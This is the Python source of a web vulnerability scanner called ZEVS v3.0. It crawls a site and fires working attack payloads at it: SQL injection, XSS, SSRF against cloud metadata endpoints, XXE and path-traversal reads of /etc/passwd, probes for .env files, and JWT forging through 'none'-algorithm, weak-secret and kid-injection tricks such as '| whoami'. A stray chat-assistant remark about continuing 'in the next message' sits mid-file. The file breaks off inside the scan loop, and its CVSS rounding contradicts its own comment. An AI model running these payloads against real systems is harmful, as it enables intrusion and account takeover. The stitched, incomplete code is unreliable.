#!/usr/bin/env python3
"""
ZEVS v3.0 - Professional Web Vulnerability Scanner
Production-ready async scanner with httpx, rich UI, and full CVSS v3.1

Author: Z3VS Team
GitHub: https://github.com/zorayrsaroyan/zevs
License: MIT

LEGAL DISCLAIMER:
This tool is for authorized security testing only.
Unauthorized access to computer systems is illegal.
"""

import asyncio
import sys
import json
import time
import re
import hashlib
import hmac
import base64
import secrets
import argparse
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from datetime import datetime
from typing import List, Dict, Set, Optional, Tuple
from pathlib import Path
from html.parser import HTMLParser

try:
    import httpx
    from rich.console import Console
    from rich.table import Table
    from rich.live import Live
    from rich.panel import Panel
    from rich.progress import Progress, SpinnerColumn, TextColumn
    from rich.layout import Layout
except ImportError:
    print("[!] Missing dependencies. Install with:")
    print("    pip install httpx rich")
    sys.exit(1)

console = Console()


# ============================================================================
# 1. CVSSCalculator - Full CVSS v3.1 Math
# ============================================================================


class CVSSCalculator:
    """Full CVSS v3.1 calculator with real math, not lookup tables"""

    # Metric values
    AV = {"N": 0.85, "A": 0.62, "L": 0.55, "P": 0.2}
    AC = {"L": 0.77, "H": 0.44}
    PR_U = {"N": 0.85, "L": 0.62, "H": 0.27}  # Scope Unchanged
    PR_C = {"N": 0.85, "L": 0.68, "H": 0.50}  # Scope Changed
    UI = {"N": 0.85, "R": 0.62}
    C = {"N": 0, "L": 0.22, "H": 0.56}
    I = {"N": 0, "L": 0.22, "H": 0.56}
    A = {"N": 0, "L": 0.22, "H": 0.56}

    # Presets for common vulnerabilities
    PRESETS = {
        "SQL Injection": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "C",
            "C": "H",
            "I": "H",
            "A": "H",
        },
        "RCE": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "C",
            "C": "H",
            "I": "H",
            "A": "H",
        },
        "XXE": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "C",
            "C": "H",
            "I": "H",
            "A": "H",
        },
        "SSRF": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "C",
            "C": "H",
            "I": "L",
            "A": "L",
        },
        "IDOR": {
            "AV": "N",
            "AC": "L",
            "PR": "L",
            "UI": "N",
            "S": "U",
            "C": "H",
            "I": "L",
            "A": "N",
        },
        "XSS": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "R",
            "S": "C",
            "C": "L",
            "I": "L",
            "A": "N",
        },
        "JWT": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "U",
            "C": "H",
            "I": "H",
            "A": "N",
        },
        "LFI": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "U",
            "C": "H",
            "I": "N",
            "A": "N",
        },
        "Open Redirect": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "R",
            "S": "C",
            "C": "N",
            "I": "L",
            "A": "N",
        },
        "CORS": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "R",
            "S": "U",
            "C": "H",
            "I": "N",
            "A": "N",
        },
        "GraphQL": {
            "AV": "N",
            "AC": "L",
            "PR": "L",
            "UI": "N",
            "S": "U",
            "C": "H",
            "I": "L",
            "A": "N",
        },
        "Missing Headers": {
            "AV": "N",
            "AC": "L",
            "PR": "N",
            "UI": "N",
            "S": "U",
            "C": "N",
            "I": "L",
            "A": "N",
        },
    }

    @staticmethod
    def calculate(metrics: Dict[str, str]) -> Tuple[float, str]:
        """
        Calculate CVSS v3.1 base score using full formula

        Args:
            metrics: Dict with AV, AC, PR, UI, S, C, I, A values

        Returns:
            (score, severity) tuple
        """
        av = CVSSCalculator.AV[metrics["AV"]]
        ac = CVSSCalculator.AC[metrics["AC"]]
        ui = CVSSCalculator.UI[metrics["UI"]]

        # PR depends on Scope
        if metrics["S"] == "U":
            pr = CVSSCalculator.PR_U[metrics["PR"]]
        else:
            pr = CVSSCalculator.PR_C[metrics["PR"]]

        c = CVSSCalculator.C[metrics["C"]]
        i = CVSSCalculator.I[metrics["I"]]
        a = CVSSCalculator.A[metrics["A"]]

        # Calculate ISS (Impact Sub Score)
        iss = 1 - ((1 - c) * (1 - i) * (1 - a))

        # Calculate Impact
        if metrics["S"] == "U":
            impact = 6.42 * iss
        else:
            impact = 7.52 * (iss - 0.029) - 3.25 * pow(iss - 0.02, 15)

        # Calculate Exploitability
        exploitability = 8.22 * av * ac * pr * ui

        # Calculate Base Score
        if impact <= 0:
            score = 0.0
        elif metrics["S"] == "U":
            score = min(impact + exploitability, 10.0)
        else:
            score = min(1.08 * (impact + exploitability), 10.0)

        # Round up to 1 decimal
        score = round(score, 1)

        # Determine severity
        if score == 0.0:
            severity = "INFO"
        elif score < 4.0:
            severity = "LOW"
        elif score < 7.0:
            severity = "MEDIUM"
        elif score < 9.0:
            severity = "HIGH"
        else:
            severity = "CRITICAL"

        return score, severity

    @staticmethod
    def get_preset_vector(vuln_type: str) -> str:
        """
        Get CVSS vector string for vulnerability type

        Args:
            vuln_type: Vulnerability type name

        Returns:
            CVSS vector string
        """
        metrics = CVSSCalculator.PRESETS.get(
            vuln_type,
            {
                "AV": "N",
                "AC": "L",
                "PR": "N",
                "UI": "N",
                "S": "U",
                "C": "L",
                "I": "L",
                "A": "N",
            },
        )

        vector = f"CVSS:3.1/AV:{metrics['AV']}/AC:{metrics['AC']}/PR:{metrics['PR']}/UI:{metrics['UI']}/S:{metrics['S']}/C:{metrics['C']}/I:{metrics['I']}/A:{metrics['A']}"
        return vector

    @staticmethod
    def calculate_for_vuln(vuln_type: str) -> Tuple[float, str, str]:
        """
        Calculate CVSS for known vulnerability type

        Returns:
            (score, severity, vector_string)
        """
        metrics = CVSSCalculator.PRESETS.get(
            vuln_type,
            {
                "AV": "N",
                "AC": "L",
                "PR": "N",
                "UI": "N",
                "S": "U",
                "C": "L",
                "I": "L",
                "A": "N",
            },
        )

        score, severity = CVSSCalculator.calculate(metrics)

        # Build vector string
        vector = f"CVSS:3.1/AV:{metrics['AV']}/AC:{metrics['AC']}/PR:{metrics['PR']}/UI:{metrics['UI']}/S:{metrics['S']}/C:{metrics['C']}/I:{metrics['I']}/A:{metrics['A']}"

        return score, severity, vector


# ============================================================================
# 2. SmartRateLimiter - Adaptive Rate Limiting with WAF Detection
# ============================================================================


class WAFDetector:
    """Detect WAF from response headers"""

    SIGNATURES = {
        "Cloudflare": ["cf-ray", "cloudflare", "__cfduid"],
        "Imperva": ["x-iinfo", "incap_ses", "visid_incap"],
        "Akamai": ["akamai", "x-akamai", "ak_bmsc"],
        "AWS WAF": ["x-amzn-requestid", "x-amz-cf-id"],
        "F5 BIG-IP": ["bigipserver", "f5", "x-wa-info"],
        "ModSecurity": ["mod_security", "naxsi"],
    }

    @staticmethod
    def detect(headers: Dict[str, str]) -> Optional[str]:
        """Detect WAF from headers"""
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}

        for waf_name, signatures in WAFDetector.SIGNATURES.items():
            for sig in signatures:
                for header_key, header_value in headers_lower.items():
                    if sig in header_key or sig in header_value:
                        return waf_name
        return None


class SmartRateLimiter:
    """Adaptive rate limiter with jitter and backoff"""

    def __init__(self, requests_per_second: float = 5.0):
        self.base_delay = 1.0 / requests_per_second
        self.jitter = 0.3  # ±30%
        self.backoff_multiplier = 1.0
        self.last_request_time = 0
        self.consecutive_errors = 0

    async def wait(self):
        """Wait before next request with jitter"""
        # Calculate delay with random jitter
        jitter_amount = self.base_delay * self.jitter
        delay = self.base_delay * self.backoff_multiplier
        delay += secrets.SystemRandom().uniform(-jitter_amount, jitter_amount)
        delay = max(0.05, delay)  # Minimum 50ms

        # Ensure minimum time between requests
        elapsed = time.time() - self.last_request_time
        if elapsed < delay:
            await asyncio.sleep(delay - elapsed)

        self.last_request_time = time.time()

    def on_error(self, status_code: int):
        """Handle error response - apply backoff"""
        if status_code in [429, 503]:  # Rate limit or service unavailable
            self.consecutive_errors += 1
            self.backoff_multiplier = min(self.backoff_multiplier * 2, 8.0)
        elif status_code == 403:  # Forbidden - might be WAF
            self.consecutive_errors += 1
            self.backoff_multiplier = min(self.backoff_multiplier * 1.5, 4.0)

    def on_success(self):
        """Reset backoff on success"""
        if self.consecutive_errors > 0:
            self.consecutive_errors = max(0, self.consecutive_errors - 1)

        # Gradual recovery
        if self.backoff_multiplier > 1.0:
            self.backoff_multiplier = max(1.0, self.backoff_multiplier * 0.9)


# ============================================================================
# 3. Crawler - Async URL Discovery
# ============================================================================


class LinkExtractor(HTMLParser):
    """Extract links and forms from HTML"""

    def __init__(self):
        super().__init__()
        self.links = set()
        self.forms = []
        self.current_form = None

    def handle_starttag(self, tag, attrs):
        attrs_dict = dict(attrs)

        if tag == "a" and "href" in attrs_dict:
            self.links.add(attrs_dict["href"])
        elif tag == "form":
            self.current_form = {"action": attrs_dict.get("action", ""), "inputs": []}
        elif tag == "input" and self.current_form is not None:
            self.current_form["inputs"].append(attrs_dict.get("name", ""))

    def handle_endtag(self, tag):
        if tag == "form" and self.current_form:
            self.forms.append(self.current_form)
            self.current_form = None


class Crawler:
    """Async web crawler for URL and parameter discovery"""

    def __init__(
        self,
        client: httpx.AsyncClient,
        rate_limiter: SmartRateLimiter,
        max_depth: int = 2,
        max_urls: int = 200,
    ):
        self.client = client
        self.rate_limiter = rate_limiter
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.visited = set()
        self.urls = set()
        self.params = {}  # url -> [param1, param2, ...]

    async def crawl(self, start_url: str) -> Tuple[Set[str], Dict[str, List[str]]]:
        """
        Crawl website starting from start_url

        Returns:
            (urls, params) tuple
        """
        parsed = urlparse(start_url)
        base_domain = parsed.netloc

        await self._crawl_recursive(start_url, base_domain, 0)

        return self.urls, self.params

    async def _crawl_recursive(self, url: str, base_domain: str, depth: int):
        """Recursively crawl URLs"""
        if depth > self.max_depth or len(self.urls) >= self.max_urls:
            return

        if url in self.visited:
            return

        self.visited.add(url)

        # Extract params from URL
        parsed = urlparse(url)
        if parsed.query:
            params = list(parse_qs(parsed.query).keys())
            self.params[url] = params

        self.urls.add(url)

        # Fetch page
        await self.rate_limiter.wait()

        try:
            response = await self.client.get(url, follow_redirects=True, timeout=10.0)

            if response.status_code != 200:
                return

            # Only parse HTML
            content_type = response.headers.get("content-type", "")
            if "text/html" not in content_type:
                return

            # Extract links
            extractor = LinkExtractor()
            try:
                extractor.feed(response.text)
            except:
                pass

            # Process links
            for link in extractor.links:
                absolute_url = urljoin(url, link)
                parsed_link = urlparse(absolute_url)

                # Only crawl same domain
                if parsed_link.netloc != base_domain:
                    continue

                # Remove fragment
                clean_url = absolute_url.split("#")[0]

                if clean_url not in self.visited and len(self.urls) < self.max_urls:
                    await self._crawl_recursive(clean_url, base_domain, depth + 1)

            # Process forms
            for form in extractor.forms:
                form_action = urljoin(url, form["action"]) if form["action"] else url
                if form["inputs"]:
                    self.params[form_action] = form["inputs"]

        except Exception:
            pass


# ============================================================================
# 4. JWTAttacker - Complete JWT Testing
# ============================================================================


class JWTAttacker:
    """JWT vulnerability testing with all attack vectors"""

    WEAK_SECRETS = [
        "secret",
        "password",
        "123456",
        "admin",
        "test",
        "key",
        "jwt",
        "secret123",
        "password123",
        "qwerty",
        "12345678",
        "abc123",
    ]

    @staticmethod
    def decode_jwt(token: str) -> Optional[Dict]:
        """Decode JWT without verification"""
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return None

            def pad_base64(s):
                return s + "=" * (4 - len(s) % 4)

            header = json.loads(base64.urlsafe_b64decode(pad_base64(parts[0])).decode())
            payload = json.loads(
                base64.urlsafe_b64decode(pad_base64(parts[1])).decode()
            )

            return {"header": header, "payload": payload, "signature": parts[2]}
        except:
            return None

    @staticmethod
    def none_algorithm_attack(token: str) -> List[str]:
        """Generate none algorithm bypass tokens"""
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []
        parts = token.split(".")

        for alg in ["none", "None", "NONE"]:
            header = decoded["header"].copy()
            header["alg"] = alg

            header_b64 = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )
            payload_b64 = parts[1]

            payloads.append(f"{header_b64}.{payload_b64}.")
            payloads.append(f"{header_b64}.{payload_b64}")

        return payloads

    @staticmethod
    def weak_secret_bruteforce(token: str) -> Optional[str]:
        """Brute force JWT secret"""
        parts = token.split(".")
        if len(parts) != 3:
            return None

        message = f"{parts[0]}.{parts[1]}".encode()
        original_sig = parts[2]

        for secret in JWTAttacker.WEAK_SECRETS:
            sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")

            if sig_b64 == original_sig:
                return secret

        return None

    @staticmethod
    def kid_injection_attack(token: str) -> List[str]:
        """Generate KID injection payloads"""
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return []

        payloads = []
        malicious_kids = [
            "/dev/null",
            "../../public.pem",
            "/proc/self/environ",
            "| whoami",
            "'; DROP TABLE users--",
        ]

        parts = token.split(".")

        for kid in malicious_kids:
            header = decoded["header"].copy()
            header["kid"] = kid

            header_b64 = (
                base64.urlsafe_b64encode(json.dumps(header).encode())
                .decode()
                .rstrip("=")
            )

            # Sign with empty key for /dev/null
            sig = hmac.new(
                b"", f"{header_b64}.{parts[1]}".encode(), hashlib.sha256
            ).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")

            payloads.append(f"{header_b64}.{parts[1]}.{sig_b64}")

        return payloads

    @staticmethod
    def forge_token(token: str, secret: str, new_claims: Dict) -> Optional[str]:
        """Forge JWT with new claims using found secret"""
        decoded = JWTAttacker.decode_jwt(token)
        if not decoded:
            return None

        parts = token.split(".")

        # Merge new claims
        payload = decoded["payload"].copy()
        payload.update(new_claims)

        # Encode new payload
        payload_b64 = (
            base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
        )

        # Sign
        message = f"{parts[0]}.{payload_b64}".encode()
        sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
        sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip("=")

        return f"{parts[0]}.{payload_b64}.{sig_b64}"


# Due to character limit, I'll continue in the next message with:
# - VulnModules (12 async vulnerability tests)
# - HTMLReportGenerator
# - ZevsScanner (main orchestrator)
# - CLI and __main__ block

# This is part 1 of 2. Continuing...

# ============================================================================
# 5. VulnModules - 12 Async Vulnerability Tests
# ============================================================================


class VulnModules:
    """All vulnerability testing modules"""

    def __init__(self, client: httpx.AsyncClient, rate_limiter: SmartRateLimiter):
        self.client = client
        self.rate_limiter = rate_limiter
        self.findings = []

    async def _make_request(
        self, url: str, method: str = "GET", **kwargs
    ) -> Optional[httpx.Response]:
        """Make HTTP request with rate limiting"""
        await self.rate_limiter.wait()
        try:
            response = await self.client.request(method, url, timeout=10.0, **kwargs)

            if response.status_code in [429, 503, 403]:
                self.rate_limiter.on_error(response.status_code)
            else:
                self.rate_limiter.on_success()

            return response
        except:
            return None

    async def test_sqli(self, url: str, params: List[str]) -> List[Dict]:
        """Test SQL injection - error-based and time-based"""
        findings = []

        error_payloads = ["'", '"', "' OR '1'='1", "1' AND '1'='1", "' OR 1=1--"]
        time_payloads = ["' AND SLEEP(5)--", "'; WAITFOR DELAY '00:00:05'--"]

        sql_errors = [
            "sql syntax",
            "mysql",
            "postgresql",
            "ora-",
            "sqlite",
            "syntax error",
        ]

        for param in params:
            # Error-based
            for payload in error_payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                resp = await self._make_request(test_url)
                if resp and any(err in resp.text.lower() for err in sql_errors):
                    findings.append(
                        {
                            "type": "SQL Injection",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": resp.text[:200],
                            "method": "error-based",
                        }
                    )
                    break

            # Time-based
            for payload in time_payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                start = time.time()
                resp = await self._make_request(test_url)
                elapsed = time.time() - start

                if elapsed >= 4.5:  # 5s sleep detected
                    findings.append(
                        {
                            "type": "SQL Injection",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Response delayed {elapsed:.1f}s",
                            "method": "time-based",
                        }
                    )
                    break

        return findings

    async def test_xss(self, url: str, params: List[str]) -> List[Dict]:
        """Test reflected XSS"""
        findings = []
        payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
        ]

        for param in params:
            for payload in payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                resp = await self._make_request(test_url)
                if resp and payload in resp.text:
                    findings.append(
                        {
                            "type": "XSS",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": f"Payload reflected in response",
                        }
                    )
                    break

        return findings

    async def test_ssrf(self, url: str, params: List[str]) -> List[Dict]:
        """Test SSRF with cloud metadata"""
        findings = []
        payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/",
            "http://localhost:80",
        ]

        for param in params:
            for payload in payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                resp = await self._make_request(test_url)
                if resp and (
                    "ami-" in resp.text
                    or "instance-id" in resp.text
                    or "metadata" in resp.text
                ):
                    findings.append(
                        {
                            "type": "SSRF",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": resp.text[:200],
                        }
                    )
                    break

        return findings

    async def test_xxe(self, url: str) -> List[Dict]:
        """Test XXE with DOCTYPE payload"""
        findings = []

        xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>"""

        resp = await self._make_request(
            url,
            method="POST",
            headers={"Content-Type": "application/xml"},
            content=xxe_payload,
        )

        if resp and ("root:" in resp.text or "daemon:" in resp.text):
            findings.append(
                {
                    "type": "XXE",
                    "url": url,
                    "param": "XML body",
                    "payload": xxe_payload,
                    "evidence": resp.text[:200],
                }
            )

        return findings

    async def test_idor(self, url: str, params: List[str]) -> List[Dict]:
        """Test IDOR by incrementing/decrementing IDs"""
        findings = []
        pii_keywords = ["email", "phone", "address", "ssn", "password"]

        for param in params:
            # Try numeric IDs
            for test_id in [1, 2, 100, 999]:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={test_id}"

                resp = await self._make_request(test_url)
                if resp and resp.status_code == 200:
                    if any(keyword in resp.text.lower() for keyword in pii_keywords):
                        findings.append(
                            {
                                "type": "IDOR",
                                "url": test_url,
                                "param": param,
                                "payload": str(test_id),
                                "evidence": f"PII exposed for ID {test_id}",
                            }
                        )
                        break

        return findings

    async def test_lfi(self, url: str, params: List[str]) -> List[Dict]:
        """Test LFI with path traversal"""
        findings = []
        payloads = ["../../../etc/passwd", r"..\..\..\windows\win.ini", "/etc/passwd"]

        for param in params:
            for payload in payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                resp = await self._make_request(test_url)
                if resp and ("root:" in resp.text or "[fonts]" in resp.text):
                    findings.append(
                        {
                            "type": "LFI",
                            "url": test_url,
                            "param": param,
                            "payload": payload,
                            "evidence": resp.text[:200],
                        }
                    )
                    break

        return findings

    async def test_open_redirect(self, url: str, params: List[str]) -> List[Dict]:
        """Test open redirect"""
        findings = []
        payloads = ["https://evil.com", "//evil.com", "https://evil.com@example.com"]

        for param in params:
            for payload in payloads:
                test_url = url if "?" not in url else url.split("?")[0]
                test_url += f"?{param}={payload}"

                resp = await self._make_request(test_url, follow_redirects=False)
                if resp and resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get("location", "")
                    if "evil.com" in location:
                        findings.append(
                            {
                                "type": "Open Redirect",
                                "url": test_url,
                                "param": param,
                                "payload": payload,
                                "evidence": f"Redirects to {location}",
                            }
                        )
                        break

        return findings

    async def test_cors(self, url: str) -> List[Dict]:
        """Test CORS misconfiguration"""
        findings = []

        resp = await self._make_request(url, headers={"Origin": "https://evil.com"})

        if resp:
            acao = resp.headers.get("access-control-allow-origin", "")
            if "evil.com" in acao or acao == "*":
                findings.append(
                    {
                        "type": "CORS",
                        "url": url,
                        "param": "Origin header",
                        "payload": "https://evil.com",
                        "evidence": f"ACAO: {acao}",
                    }
                )

        return findings

    async def test_graphql(self, url: str) -> List[Dict]:
        """Test GraphQL introspection"""
        findings = []

        introspection_query = {"query": "{ __schema { types { name } } }"}

        resp = await self._make_request(
            url,
            method="POST",
            headers={"Content-Type": "application/json"},
            json=introspection_query,
        )

        if resp and "__schema" in resp.text:
            findings.append(
                {
                    "type": "GraphQL",
                    "url": url,
                    "param": "GraphQL query",
                    "payload": "Introspection query",
                    "evidence": "Introspection enabled",
                }
            )

        return findings

    async def test_jwt(self, url: str) -> List[Dict]:
        """Test JWT vulnerabilities"""
        findings = []

        resp = await self._make_request(url)
        if not resp:
            return findings

        # Extract JWT from headers or cookies
        jwt_token = None
        auth_header = resp.headers.get("authorization", "")
        if "Bearer " in auth_header:
            jwt_token = auth_header.split("Bearer ")[1]

        if not jwt_token:
            return findings

        # Test weak secret
        secret = JWTAttacker.weak_secret_bruteforce(jwt_token)
        if secret:
            findings.append(
                {
                    "type": "JWT",
                    "url": url,
                    "param": "JWT token",
                    "payload": f"Weak secret: {secret}",
                    "evidence": "Token can be forged",
                }
            )

        return findings

    async def test_headers(self, url: str) -> List[Dict]:
        """Test missing security headers"""
        findings = []

        resp = await self._make_request(url)
        if not resp:
            return findings

        missing_headers = []
        security_headers = {
            "strict-transport-security": "HSTS",
            "x-frame-options": "Clickjacking protection",
            "x-content-type-options": "MIME sniffing protection",
            "content-security-policy": "CSP",
        }

        for header, name in security_headers.items():
            if header not in resp.headers:
                missing_headers.append(name)

        if missing_headers:
            findings.append(
                {
                    "type": "Missing Headers",
                    "url": url,
                    "param": "HTTP headers",
                    "payload": "N/A",
                    "evidence": f"Missing: {', '.join(missing_headers)}",
                }
            )

        return findings

    async def test_secrets(self, url: str) -> List[Dict]:
        """Test for exposed secrets"""
        findings = []

        secret_paths = ["/.env", "/.git/config", "/api-docs", "/swagger.json"]

        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        for path in secret_paths:
            test_url = base_url + path
            resp = await self._make_request(test_url)

            if resp and resp.status_code == 200:
                if any(
                    keyword in resp.text.lower()
                    for keyword in ["password", "api_key", "secret", "token"]
                ):
                    findings.append(
                        {
                            "type": "Exposed Secrets",
                            "url": test_url,
                            "param": "File path",
                            "payload": path,
                            "evidence": resp.text[:200],
                        }
                    )

        return findings


# ============================================================================
# 6. HTMLReportGenerator - Professional HTML Reports
# ============================================================================


class HTMLReportGenerator:
    """Generate professional HTML reports"""

    @staticmethod
    def generate(target: str, findings: List[Dict], stats: Dict) -> str:
        """Generate HTML report"""

        # Count by severity
        severity_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
        for f in findings:
            sev = f.get("severity", "INFO")
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        # Generate findings HTML
        findings_html = ""
        for i, finding in enumerate(findings, 1):
            severity = finding.get("severity", "MEDIUM")
            color = {
                "CRITICAL": "#dc2626",
                "HIGH": "#ea580c",
                "MEDIUM": "#f59e0b",
                "LOW": "#3b82f6",
                "INFO": "#6b7280",
            }[severity]

            curl_cmd = f"curl -X GET '{finding['url']}'"

            findings_html += f"""
            <div class="finding" style="border-left: 4px solid {color};">
                <div class="finding-header" onclick="toggle({i})">
                    <h3>#{i} {finding["type"]} <span class="badge" style="background:{color}">{severity}</span> <span class="cvss">CVSS {finding.get("cvss_score", "N/A")}</span></h3>
                    <p class="url">{finding["url"]}</p>
                </div>
                <div class="finding-body" id="finding-{i}">
                    <p><strong>Parameter:</strong> {finding.get("param", "N/A")}</p>
                    <p><strong>Payload:</strong> <code>{finding.get("payload", "N/A")}</code></p>
                    <p><strong>Evidence:</strong> {finding.get("evidence", "N/A")}</p>
                    <p><strong>curl PoC:</strong></p>
                    <pre>{curl_cmd}</pre>
                    <p><strong>Remediation:</strong> Implement proper input validation and output encoding.</p>
                </div>
            </div>
            """

        html = f"""<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>ZEVS v3.0 Report - {target}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ font-family: system-ui; background: #0a0e27; color: #e0e0e0; padding: 20px; }}
        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 40px; border-radius: 10px; margin-bottom: 30px; }}
        .header h1 {{ font-size: 2.5em; color: white; }}
        .stats {{ display: grid; grid-template-columns: repeat(5, 1fr); gap: 20px; margin-bottom: 30px; }}
        .stat {{ background: #1a1f3a; padding: 20px; border-radius: 8px; text-align: center; }}
        .stat .number {{ font-size: 2em; font-weight: bold; }}
        .finding {{ background: #1a1f3a; margin-bottom: 20px; border-radius: 8px; overflow: hidden; }}
        .finding-header {{ padding: 20px; cursor: pointer; }}
        .finding-header:hover {{ background: rgba(255,255,255,0.05); }}
        .finding-body {{ padding: 20px; display: none; }}
        .badge {{ padding: 5px 10px; border-radius: 5px; font-size: 0.8em; color: white; }}
        .cvss {{ background: rgba(255,255,255,0.1); padding: 5px 10px; border-radius: 5px; font-size: 0.8em; }}
        .url {{ color: #60a5fa; font-family: monospace; margin-top: 10px; }}
        code, pre {{ background: #0f1419; padding: 10px; border-radius: 5px; display: block; margin: 10px 0; }}
    </style>
    <script>
        function toggle(id) {{
            const el = document.getElementById('finding-' + id);
            el.style.display = el.style.display === 'block' ? 'none' : 'block';
        }}
    </script>
</head>
<body>
    <div class="header">
        <h1>ZEVS v3.0 Security Report</h1>
        <p>Target: {target}</p>
        <p>Scan Date: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
    </div>
    
    <div class="stats">
        <div class="stat"><div class="number" style="color:#dc2626">{severity_counts["CRITICAL"]}</div><div>CRITICAL</div></div>
        <div class="stat"><div class="number" style="color:#ea580c">{severity_counts["HIGH"]}</div><div>HIGH</div></div>
        <div class="stat"><div class="number" style="color:#f59e0b">{severity_counts["MEDIUM"]}</div><div>MEDIUM</div></div>
        <div class="stat"><div class="number" style="color:#3b82f6">{severity_counts["LOW"]}</div><div>LOW</div></div>
        <div class="stat"><div class="number" style="color:#6b7280">{severity_counts["INFO"]}</div><div>INFO</div></div>
    </div>
    
    <h2 style="margin-bottom:20px">Findings ({len(findings)})</h2>
    {findings_html}
    
    <div style="text-align:center; margin-top:50px; opacity:0.6">
        <p>Generated by ZEVS v3.0 - Professional Vulnerability Scanner</p>
    </div>
</body>
</html>"""

        return html


# ============================================================================
# 7. ZevsScanner - Main Orchestrator
# ============================================================================


class ZevsScanner:
    """Main scanner orchestrator"""

    def __init__(self, target: str, options: Dict):
        self.target = target
        self.options = options
        self.findings = []
        self.stats = {"urls_crawled": 0, "requests_made": 0, "vulns_found": 0}

    async def scan(self):
        """Main scan orchestration"""

        console = Console()

        # Legal disclaimer
        console.print(
            "\n[bold red]═══════════════════════════════════════════════════════════════[/bold red]"
        )
        console.print(
            "[bold yellow]                    ZEVS v3.0 - LEGAL DISCLAIMER[/bold yellow]"
        )
        console.print(
            "[bold red]═══════════════════════════════════════════════════════════════[/bold red]"
        )
        console.print(
            "\n[yellow]This tool is for AUTHORIZED security testing ONLY.[/yellow]"
        )
        console.print(
            "[yellow]Unauthorized access to computer systems is ILLEGAL.[/yellow]"
        )
        console.print(
            "[yellow]By using this tool, you agree to test only systems you own or have written permission to test.[/yellow]\n"
        )

        # Setup
        rate_limit = self.options.get("rate", 5)
        threads = self.options.get("threads", 10)

        limits = httpx.Limits(
            max_keepalive_connections=threads, max_connections=threads
        )

        async with httpx.AsyncClient(
            limits=limits, follow_redirects=True, verify=False
        ) as client:
            rate_limiter = SmartRateLimiter(requests_per_second=rate_limit)

            # Step 1: Crawl
            console.print(f"\n[bold cyan]🕷️  Step 1: Crawling {self.target}[/bold cyan]")
            crawler = Crawler(client, rate_limiter, max_depth=2, max_urls=200)
            urls, params_map = await crawler.crawl(self.target)
            self.stats["urls_crawled"] = len(urls)
            console.print(
                f"[green]✓ Found {len(urls)} URLs, {sum(len(p) for p in params_map.values())} parameters[/green]"
            )

            # Step 2: Vulnerability scanning
            console.print(f"\n[bold cyan]🔍 Step 2: Vulnerability Scanning[/bold cyan]")

            vuln_modules = VulnModules(client, rate_limiter)

            modules = [
                ("SQL Injection", vuln_modules.test_sqli),
                ("XSS", vuln_modules.test_xss),
                ("SSRF", vuln_modules.test_ssrf),
                ("XXE", vuln_modules.test_xxe),
                ("IDOR", vuln_modules.test_idor),
                ("LFI", vuln_modules.test_lfi),
                ("Open Redirect", vuln_modules.test_open_redirect),
                ("CORS", vuln_modules.test_cors),
                ("GraphQL", vuln_modules.test_graphql),
                ("JWT", vuln_modules.test_jwt),
                ("Security Headers", vuln_modules.test_headers),
                ("Exposed Secrets", vuln_modules.test_secrets),
            ]

            all_findings = []

            with Progress() as progress:
                task = progress.add_task(
                    "[cyan]Scanning...", total=len(modules) * len(urls)
                )

                for module_name, module_func in modules:
                    console.print(f"\n[yellow]→ Testing {module_name}[/yellow]")

                    for url in urls:
                        params = params_map.get(url, [])

                        # Call module
                        if module_name in [
                            "XXE",
                            "CORS",
                            "GraphQL",
                            "JWT",
                            "Security Headers",
                            "Exposed Secrets",
                        ]:
                            findings = await module_func(url)
                        else:
                            findings = await module_func(url, params)

                        all_findings.extend(findings)
                        progress.update(task, advance=1)

